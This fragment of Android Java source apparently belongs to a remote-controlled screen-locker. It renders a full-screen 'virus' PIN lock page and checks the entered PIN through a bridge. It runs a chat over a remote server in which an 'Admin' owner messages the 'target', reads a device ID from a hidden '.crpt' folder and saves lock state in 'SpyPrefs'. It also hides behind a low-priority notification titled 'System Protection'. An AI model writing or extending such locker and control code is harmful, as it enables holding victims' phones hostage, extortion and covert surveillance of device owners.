"    </g>\n" +
"  </svg>\n" +
"</div>\n" +
"\n" +
"<!-- MAIN CONTENT -->\n" +
"<div id=\"mainContent\">\n" +
"  <div class=\"virus-wrap\">\n" +
"    <div class=\"v-orbit\">\n" +
"      <div class=\"spike-dot\"></div>\n" +
"      <div class=\"spike-dot\"></div>\n" +
"      <div class=\"spike-dot\"></div>\n" +
"      <div class=\"spike-dot\"></div>\n" +
"    </div>\n" +
"    <div class=\"v-orbit2\"></div>\n" +
"    <div class=\"virus-bg\">\n" +
"      <!-- Animated Virus SVG -->\n" +
"      <svg class=\"virus-svg\" width=\"52\" height=\"52\" viewBox=\"0 0 100 100\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
"        <!-- Core circle -->\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"22\" fill=\"rgba(0,255,65,.08)\" stroke=\"#00ff41\" stroke-width=\"1.8\"/>\n" +
"        <!-- Inner DNA-like strands -->\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"13\" fill=\"rgba(0,255,65,.06)\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-dasharray=\"4 3\"/>\n" +
"        <!-- Center dot -->\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"4\" fill=\"rgba(0,255,65,.5)\" stroke=\"#00ff41\" stroke-width=\"1\"/>\n" +
"        <!-- Spikes (12 spikes) -->\n" +
"        <line x1=\"50\" y1=\"22\" x2=\"50\" y2=\"10\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"50\" cy=\"8\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"72\" y1=\"33\" x2=\"81\" y2=\"24\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"83\" cy=\"22\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"78\" y1=\"50\" x2=\"90\" y2=\"50\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"92\" cy=\"50\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"72\" y1=\"67\" x2=\"81\" y2=\"76\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"83\" cy=\"78\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"50\" y1=\"78\" x2=\"50\" y2=\"90\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"50\" cy=\"92\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"28\" y1=\"67\" x2=\"19\" y2=\"76\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"17\" cy=\"78\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"22\" y1=\"50\" x2=\"10\" y2=\"50\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"8\" cy=\"50\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <line x1=\"28\" y1=\"33\" x2=\"19\" y2=\"24\" stroke=\"#00ff41\" stroke-width=\"1.8\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"17\" cy=\"22\" r=\"3.5\" fill=\"rgba(0,255,65,.3)\" stroke=\"#00ff41\" stroke-width=\"1.2\"/>\n" +
"\n" +
"        <!-- Diagonal spikes (shorter) -->\n" +
"        <line x1=\"61\" y1=\"24\" x2=\"66\" y2=\"16\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"68\" cy=\"13\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"76\" y1=\"39\" x2=\"84\" y2=\"34\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"86\" cy=\"32\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"76\" y1=\"61\" x2=\"84\" y2=\"66\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"86\" cy=\"68\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"61\" y1=\"76\" x2=\"66\" y2=\"84\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"68\" cy=\"87\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"39\" y1=\"76\" x2=\"34\" y2=\"84\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"32\" cy=\"87\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"24\" y1=\"61\" x2=\"16\" y2=\"66\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"14\" cy=\"68\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"24\" y1=\"39\" x2=\"16\" y2=\"34\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"14\" cy=\"32\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"        <line x1=\"39\" y1=\"24\" x2=\"34\" y2=\"16\" stroke=\"#00ff41\" stroke-width=\"1.2\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"32\" cy=\"13\" r=\"2.5\" fill=\"#00ff41\" opacity=\".5\"/>\n" +
"      </svg>\n" +
"    </div>\n" +
"  </div>\n" +
"\n" +
"  <div class=\"lock-title\">" + safeTitle + "</div>\n" +
"  <div class=\"lock-sub\">Enter Pin To Unlock</div>\n" +
"\n" +
"  <div class=\"pin-wrap\">\n" +
"    <div class=\"pin-dot\" id=\"d0\"></div>\n" +
"    <div class=\"pin-dot\" id=\"d1\"></div>\n" +
"    <div class=\"pin-dot\" id=\"d2\"></div>\n" +
"    <div class=\"pin-dot\" id=\"d3\"></div>\n" +
"  </div>\n" +
"\n" +
"  <div class=\"pin-status\" id=\"pinStatus\">Creator Fiona</div>\n" +
"\n" +
"  <div class=\"keypad\" id=\"keypad\">\n" +
"    <div class=\"key\" data-n=\"1\"><span class=\"num\">1</span><span class=\"sub\"></span></div>\n" +
"    <div class=\"key\" data-n=\"2\"><span class=\"num\">2</span><span class=\"sub\">ABC</span></div>\n" +
"    <div class=\"key\" data-n=\"3\"><span class=\"num\">3</span><span class=\"sub\">DEF</span></div>\n" +
"    <div class=\"key\" data-n=\"4\"><span class=\"num\">4</span><span class=\"sub\">GHI</span></div>\n" +
"    <div class=\"key\" data-n=\"5\"><span class=\"num\">5</span><span class=\"sub\">JKL</span></div>\n" +
"    <div class=\"key\" data-n=\"6\"><span class=\"num\">6</span><span class=\"sub\">MNO</span></div>\n" +
"    <div class=\"key\" data-n=\"7\"><span class=\"num\">7</span><span class=\"sub\">PQRS</span></div>\n" +
"    <div class=\"key\" data-n=\"8\"><span class=\"num\">8</span><span class=\"sub\">TUV</span></div>\n" +
"    <div class=\"key\" data-n=\"9\"><span class=\"num\">9</span><span class=\"sub\">WXYZ</span></div>\n" +
"    <div class=\"key empty\"></div>\n" +
"    <div class=\"key\" data-n=\"0\"><span class=\"num\">0</span></div>\n" +
"    <div class=\"key del\" data-del=\"1\">\n" +
"      <svg width=\"22\" height=\"22\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.8\">\n" +
"        <path d=\"M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z\"/>\n" +
"        <line x1=\"18\" y1=\"9\" x2=\"12\" y2=\"15\"/><line x1=\"12\" y1=\"9\" x2=\"18\" y2=\"15\"/>\n" +
"      </svg>\n" +
"    </div>\n" +
"  </div>\n" +
"</div>\n" +
"\n" +
"<script>\n" +
"/* ── INTRO PERCENT COUNTER ── */\n" +
"(function(){\n" +
"  var el = document.getElementById('pctNum');\n" +
"  var start = null;\n" +
"  var dur = 2500;\n" +
"  function step(ts){\n" +
"    if(!start) start = ts + 500;\n" +
"    var p = Math.min(1, Math.max(0,(ts-start)/dur));\n" +
"    var v = Math.floor(p*100);\n" +
"    el.textContent = v + '%';\n" +
"    if(p < 1) requestAnimationFrame(step);\n" +
"  }\n" +
"  requestAnimationFrame(step);\n" +
"})();\n" +
"\n" +
"/* ── HIDE INTRO AFTER ANIMATION ── */\n" +
"setTimeout(function(){\n" +
"  var intro = document.getElementById('introScreen');\n" +
"  intro.style.pointerEvents = 'none';\n" +
"  setTimeout(function(){ intro.style.display='none'; }, 400);\n" +
"}, 4000);\n" +
"\n" +
"/* ── DATA STREAM COLUMNS ── */\n" +
"(function(){\n" +
"  var chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEF';\n" +
"  var container = document.getElementById('dataStream');\n" +
"  var cols = Math.floor(window.innerWidth / 22);\n" +
"  for(var i=0;i<cols;i++){\n" +
"    var col = document.createElement('div');\n" +
"    col.className = 'data-col';\n" +
"    col.style.left = (i*22) + 'px';\n" +
"    col.style.animationDuration = (6 + Math.random()*14) + 's';\n" +
"    col.style.animationDelay = (Math.random()*-20) + 's';\n" +
"    col.style.opacity = (.04 + Math.random()*.1).toString();\n" +
"    var txt = '';\n" +
"    for(var j=0;j<32;j++){\n" +
"      txt += chars[Math.floor(Math.random()*chars.length)] + '\\n';\n" +
"    }\n" +
"    col.textContent = txt;\n" +
"    container.appendChild(col);\n" +
"  }\n" +
"})();\n" +
"\n" +
"/* ── PIN LOGIC ── */\n" +
"var pin = '';\n" +
"var blocked = false;\n" +
"document.getElementById('keypad').addEventListener('touchend', function(e) {\n" +
"  e.preventDefault();\n" +
"  var key = e.target.closest('.key');\n" +
"  if (!key || key.classList.contains('empty')) return;\n" +
"  if (key.dataset.del) { doDelete(); return; }\n" +
"  if (key.dataset.n !== undefined) doPress(key.dataset.n);\n" +
"}, { passive: false });\n" +
"document.getElementById('keypad').addEventListener('click', function(e) {\n" +
"  if (e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return;\n" +
"  var key = e.target.closest('.key');\n" +
"  if (!key || key.classList.contains('empty')) return;\n" +
"  if (key.dataset.del) { doDelete(); return; }\n" +
"  if (key.dataset.n !== undefined) doPress(key.dataset.n);\n" +
"});\n" +
"function doPress(n) {\n" +
"  if (blocked || pin.length >= 4) return;\n" +
"  pin += n;\n" +
"  updateDots();\n" +
"  if (pin.length === 4) setTimeout(checkPin, 150);\n" +
"}\n" +
"function doDelete() {\n" +
"  if (blocked) return;\n" +
"  pin = pin.slice(0, -1);\n" +
"  updateDots();\n" +
"  setStatus('', false, false);\n" +
"}\n" +
"function updateDots() {\n" +
"  for (var i = 0; i < 4; i++) {\n" +
"    var d = document.getElementById('d' + i);\n" +
"    d.classList.toggle('filled', i < pin.length);\n" +
"    d.classList.remove('error');\n" +
"  }\n" +
"}\n" +
"function checkPin() {\n" +
"  var ok = false;\n" +
"  try { ok = LockBridge.tryUnlock(pin); } catch(e) {}\n" +
"  if (ok) {\n" +
"    setStatus('PIN Benar \\u2713', false, true);\n" +
"  } else {\n" +
"    setStatus('PIN Salah!', true, false);\n" +
"    for (var i = 0; i < 4; i++) {\n" +
"      document.getElementById('d' + i).classList.add('error');\n" +
"    }\n" +
"    blocked = true;\n" +
"    setTimeout(function() {\n" +
"      pin = ''; blocked = false;\n" +
"      updateDots();\n" +
"      setStatus('Coba lagi', false, false);\n" +
"    }, 1200);\n" +
"  }\n" +
"}\n" +
"function setStatus(msg, isErr, isOk) {\n" +
"  var el = document.getElementById('pinStatus');\n" +
"  el.textContent = msg || 'Ketuk angka untuk memasukkan PIN';\n" +
"  el.className = 'pin-status' + (isErr ? ' err' : isOk ? ' ok' : '');\n" +
"}\n" +
"</script>\n" +
"</body>\n" +
"</html>";
    }

    // ── CHAT ──
    private void startChatPoll() {
        chatRunnable = new Runnable() {
            @Override public void run() {
                pollChat();
                chatHandler.postDelayed(this, 3000);
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty()) return;
        new Thread(() -> {
            try {
                String resp = httpGet(SERVER + "/api/lock-chat/" + deviceId);
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < msgs.length(); i++) {
                    JSONObject m = msgs.getJSONObject(i);
                    String from = m.optString("from", "owner");
                    String text = m.optString("text", "");
                    String time = m.optString("time", "");
                    sb.append(from.equals("owner") ? "[ Admin ] " : "[ You ] ")
                      .append(text).append("  ").append(time).append("\n");
                }
                final String s = sb.toString();
                uiHandler.post(() -> {
                    if (tvChat != null) {
                        tvChat.append(s);
                        if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty()) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> {
            if (tvChat != null) {
                tvChat.append("[ You ] " + text + "\n");
                if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
            }
        });
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject();
                b.put("text", text);
                b.put("from", "target");
                postJson(SERVER + "/api/lock-chat/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    // ── HELPERS ──
    private String readId() {
        try {
            SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
            String id = p.getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        try {
            java.io.File f = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new java.io.FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        return "";
    }

    private void saveLock(String msg, String p2, boolean locked) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("isLocked", locked)
            .putString("lockMessage", msg)
            .putString("lockPin", p2)
            .apply();
    }

    private int dp(int v) { return (int)(v * getResources().getDisplayMetrics().density); }
    private android.graphics.drawable.GradientDrawable roundBg(int color, int r) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(dp(r));
        return d;
    }
    private View divider() {
        View v = new View(this);
        v.setBackgroundColor(Color.parseColor("#222244"));
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, 1);
        p2.setMargins(0, dp(16), 0, dp(16));
        v.setLayoutParams(p2);
        return v;
    }
    private void lp(View v, int l, int t, int r, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        p2.setMargins(l, t, r, b);
        v.setLayoutParams(p2);
    }
    private android.view.ViewGroup.LayoutParams lpH(int h, int l, int t, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, h);
        p2.setMargins(l, t, 0, b);
        return p2;
    }
    private String httpGet(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Lock Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Protection")
            .setContentText("Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
}